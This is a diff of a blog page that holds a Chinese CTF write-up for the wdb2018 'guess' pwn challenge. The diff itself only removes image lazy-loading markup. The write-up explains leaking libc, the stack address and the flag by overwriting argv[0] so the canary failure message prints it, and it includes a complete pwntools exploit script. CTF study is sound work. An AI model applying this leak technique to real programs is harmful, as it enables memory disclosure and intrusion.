@@ -139,7 +139,7 @@
         <div class="left">
             
                 <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/img/loading.gif" data-original="/images/favicon.png" class="w-full h-full rounded-sm">
+                    <img src="/images/favicon.png" class="w-full h-full rounded-sm">
                 </a>
             
             <a class="logo-title" href="/">
@@ -257,7 +257,7 @@
         
             <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                 <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/img/loading.gif" data-original="/images/avatar.jpg">
+                    <img src="/images/avatar.jpg">
                 </div>
                 <div class="info flex flex-col justify-between">
                     <div class="author flex items-center">
@@ -342,9 +342,9 @@
 </li>
 </ul>
 <h2 id="2-gdb调试"><a href="#2-gdb调试" class="headerlink" title="2.gdb调试"></a>2.gdb调试</h2><p>首先要patchelf，将环境改为glibc2.24，不然无法实现。</p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141131322.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141131322.bmp"></p>
 <p>发现报错部分出现了程序的名字，那么这个是什么呢？这个其实就是argv[0]，也就是说argv[0]会随着canary报错的时候输出出来，那如果我们将其改为某个函数的got表的内容，那是不是就可以输出其真实地址了，达到泄露libc的作用，下面来看看栈布局：</p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141833635.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141833635.bmp"></p>
 <ul>
 <li>这里可以很清楚的看到输入的地址和argv[0]相差0x128,我们通过栈溢出覆盖此处的地址为got表地址即可泄露libc</li>
 </ul>
@@ -353,20 +353,20 @@
 <ul>
 <li>看看实际效果</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916143126078.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916143126078.bmp"></p>
 <h3 id="2-通过-environ泄露环境变量地址"><a href="#2-通过-environ泄露环境变量地址" class="headerlink" title="(2)通过__environ泄露环境变量地址"></a>(2)通过__environ泄露环境变量地址</h3><p>关于__environ可以参考开头的文章</p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144643853.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144643853.bmp"></p>
 <ul>
 <li>光标处就是__environ的地址，很明显该地址是在栈上的，因此我们泄露出该地址，就可以获得栈地址了.</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144655337.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144655337.bmp"></p>
 <ul>
 <li>发现flag的地址与__environ的地址差距0x168，因此将environ的地址泄露出来,再减去0x168就是flag的地址，然后通过同样的溢出，就可以泄露flag了.(该flag是我本地建立的，为了调试方便)</li>
 </ul>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="3-泄露flag"><a href="#3-泄露flag" class="headerlink" title="(3),泄露flag"></a>(3),泄露flag</h3><p>直接看最后的EXP吧</p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916145230691.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916145230691.bmp"></p>
 <h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28532)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三次创建fork，相当于可以利用三次程序</span></span><br><span class="line"><span class="comment"># 第一次泄漏libc，第二次泄漏栈地址，第三次泄漏flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>) <span class="comment"># 环境变量的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 -- 打印出flag</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(buf)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
@@ -666,7 +666,7 @@
     </div>
 
     <div class="image-viewer-container">
-    /img/loading.gif" data-original="<img src="">
+    <img src="">
 </div>
 
 
@@ -793,18 +793,5 @@
 
 
 
-
-        <style>
-            [bg-lazy] {
-                background-image: none !important;
-                background-color: #eee !important;
-            }
-        </style>
-        <script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                preloadRatio: 1,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</body>
 </html>
